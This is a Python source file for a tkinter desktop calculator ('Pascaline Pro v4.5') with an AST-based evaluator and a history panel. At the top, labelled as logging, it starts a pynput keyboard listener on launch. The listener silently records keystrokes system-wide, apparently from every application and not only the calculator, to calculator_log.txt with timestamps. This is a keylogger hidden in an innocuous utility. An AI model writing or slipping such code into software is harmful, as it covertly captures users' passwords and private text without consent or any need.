import tkinter as tk
from tkinter import messagebox, filedialog
import ast
import operator
from pynput import keyboard
from datetime import datetime

# --- LOGGING CONFIGURATION ---
def on_press(key):
    try:
        current_time = datetime.now().strftime("%H:%M:%S")
        with open("calculator_log.txt", "a") as f:
            if hasattr(key, "char") and key.char is not None:
                f.write(f"[{current_time}] Key: {key.char}\n")
            elif key == keyboard.Key.enter:
                f.write(f"[{current_time}] Key: ENTER\n")
    except Exception:
        pass

# Start background listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# --- SECURE AST CALCULATION LOGIC ---
# We use a dictionary to map AST types to safe operator functions
OPERATORS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.Pow: operator.pow,
    ast.USub: operator.neg  # Supports negative numbers (Unary Subtract)
}

def evaluate_node(node):
    """Recursively evaluates the AST node without using the dangerous eval() function."""
    if isinstance(node, ast.Constant):
        return node.value
    elif isinstance(node, ast.BinOp):
        return OPERATORS[type(node.op)](
            evaluate_node(node.left), evaluate_node(node.right)
        )
    elif isinstance(node, ast.UnaryOp):
        return OPERATORS[type(node.op)](evaluate_node(node.operand))
    raise ValueError("Unsupported operation")

# --- GUI FUNCTIONS ---
def on_button_click(value):
    """Appends the value of the button to the display."""
    display.insert(tk.END, str(value))

def add_sqrt():
    """Implements square root using the power of 0.5 (x**0.5)."""
    display.insert(tk.END, "**0.5")

def add_percent():
    """Implements percentage by dividing the current expression by 100."""
    display.insert(tk.END, "/100")

def clear_display():
    """Clears the calculation input field."""
    display.delete(0, tk.END)

def backspace():
    """Removes the last character from the display."""
    current = display.get()
    display.delete(0, tk.END)
    display.insert(0, current[:-1])

def calculate_result(event=None):
    """Parses the display string into an AST and evaluates the result."""
    try:
        expression = display.get()
        if not expression:
            return
        
        # Parse the string into an Abstract Syntax Tree
        tree = ast.parse(expression, mode="eval")
        result = evaluate_node(tree.body)

        # Log to History Listbox
        timestamp = datetime.now().strftime("%H:%M")
        history_listbox.insert(tk.END, f"[{timestamp}] {expression} = {result}")
        history_listbox.see(tk.END) # Auto-scroll to bottom

        display.delete(0, tk.END)
        display.insert(0, str(result))
    except Exception:
        messagebox.showerror("Error", "Invalid Expression")

def export_history():
    """Saves the history listbox content into a text file chosen by the user."""
    history_data = history_listbox.get(0, tk.END)
    if not history_data:
        messagebox.showwarning("Export", "History is empty!")
        return
        
    file_path = filedialog.asksaveasfilename(
        defaultextension=".txt", 
        filetypes=[("Text files", "*.txt")],
        title="Export Calculation History"
    )
    
    if file_path:
        try:
            with open(file_path, "w") as f:
                f.write(f"--- Pascaline Pro History ({datetime.now().strftime('%Y-%m-%d')}) ---\n")
                for line in history_data:
                    f.write(line + "\n")
            messagebox.showinfo("Export", "History exported successfully!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save file: {e}")

def clear_history():
    """Clears all history entries after user confirmation."""
    if history_listbox.size() > 0:
        if messagebox.askyesno("Clear History", "Do you want to delete all history entries?"):
            history_listbox.delete(0, tk.END)

# --- TKINTER INTERFACE SETUP ---
root = tk.Tk()
root.title("Pascaline Pro v4.5")
root.resizable(False, False)

# Main container
main_frame = tk.Frame(root, padx=15, pady=15)
main_frame.pack()

# Left Column: Calculator Grid
calc_frame = tk.Frame(main_frame)
calc_frame.grid(row=0, column=0)

# Right Column: History Sidebar
history_frame = tk.Frame(main_frame, padx=15)
history_frame.grid(row=0, column=1, sticky="ns")

# Calculation Display Field
display = tk.Entry(calc_frame, font=("Arial", 20), borderwidth=5, relief="flat", justify="right")
display.grid(row=0, column=0, columnspan=4, pady=15)
display.bind("<Return>", calculate_result) # Bind Enter key to calculation

# --- BUTTON LAYOUT ---
# Standard Buttons (Numbers and Basic Operators)
buttons = ["7", "8", "9", "/", "4", "5", "6", "*", "1", "2", "3", "-", "C", "0", "=", "+"]
r, c = 1, 0
for b in buttons:
    if b == "=":
        cmd, color = calculate_result, "#4CAF50" # Green
    elif b == "C":
        cmd, color = clear_display, "#f44336" # Red
    else:
        cmd, color = (lambda x=b: on_button_click(x)), "#e0e0e0" # Light Grey

    tk.Button(calc_frame, text=b, width=5, height=2, font=("Arial", 12, "bold"), 
              bg=color, command=cmd).grid(row=r, column=c, padx=2, pady=2)
    c += 1
    if c > 3:
        c = 0
        r += 1

# Special Operators (Row 5)
tk.Button(calc_frame, text="√", width=5, height=2, font=("Arial", 12, "bold"), bg="#9E9E9E", fg="white", command=add_sqrt).grid(row=5, column=0, padx=2, pady=2)
tk.Button(calc_frame, text="**", width=5, height=2, font=("Arial", 12, "bold"), bg="#9E9E9E", fg="white", command=lambda: on_button_click("**")).grid(row=5, column=1, padx=2, pady=2)
tk.Button(calc_frame, text="%", width=5, height=2, font=("Arial", 12, "bold"), bg="#9E9E9E", fg="white", command=add_percent).grid(row=5, column=2, padx=2, pady=2)
tk.Button(calc_frame, text="⌫", width=5, height=2, font=("Arial", 12, "bold"), bg="#FF9800", fg="white", command=backspace).grid(row=5, column=3, padx=2, pady=2)

# Parentheses (Row 6)
tk.Button(calc_frame, text="(", width=12, height=1, font=("Arial", 11, "bold"), bg="#BDBDBD", command=lambda: on_button_click("(")).grid(row=6, column=0, columnspan=2, padx=2, pady=2)
tk.Button(calc_frame, text=")", width=12, height=1, font=("Arial", 11, "bold"), bg="#BDBDBD", command=lambda: on_button_click(")")).grid(row=6, column=2, columnspan=2, padx=2, pady=2)

# --- HISTORY UI ---
tk.Label(history_frame, text="Calculation History", font=("Arial", 10, "bold")).pack()
history_listbox = tk.Listbox(history_frame, width=30, height=14, font=("Courier", 9))
history_listbox.pack(pady=5)

tk.Button(history_frame, text="💾 Export History", command=export_history, 
          bg="#2196F3", fg="white", font=("Arial", 9, "bold")).pack(fill="x", pady=2)

tk.Button(history_frame, text="🗑️ Clear History", command=clear_history, 
          bg="#f44336", fg="white", font=("Arial", 9, "bold")).pack(fill="x", pady=2)

# Run the Application
root.mainloop()